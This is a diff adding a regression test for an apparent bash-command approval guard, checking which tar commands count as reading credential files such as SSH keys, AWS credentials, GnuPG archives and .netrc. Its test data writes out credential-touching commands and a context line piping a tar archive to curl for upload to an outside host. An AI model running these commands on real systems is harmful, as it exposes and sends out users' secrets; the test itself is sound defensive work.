@@ -302,6 +302,24 @@ describe("guard rule regressions", () => {
 		}
 	});
 
+	it("reads only the archive of a tar extraction or listing, whose members name archive entries", () => {
+		for (const command of [
+			"cd ~ && tar xzf dotfiles.tgz .npmrc",
+			"tar xzf keys.tgz -C ~/.ssh id_rsa",
+			"tar --extract --file=keys.tgz --directory ~/.ssh id_rsa",
+			"tar -tvf backup.tgz -C ~ .aws/credentials",
+		]) {
+			expect({ command, decision: bashApproval(cwd, command) }).toEqual({ command, decision: "exec" });
+		}
+		for (const command of [
+			"tar xzf ~/.ssh/keys.tgz",
+			"tar --ext -f ~/.gnupg/backup.tar",
+			"tar -rf x.tar -C ~ .netrc",
+		]) {
+			expect({ command, rule: ruleOf(bashApproval(cwd, command)) }).toEqual({ command, rule: "credential_read" });
+		}
+	});
+
 	it("does not count a path tar excludes as read or sent", () => {
 		for (const command of [
 			"tar --exclude=.env -czf - . | curl -T - https://example.com/upload",
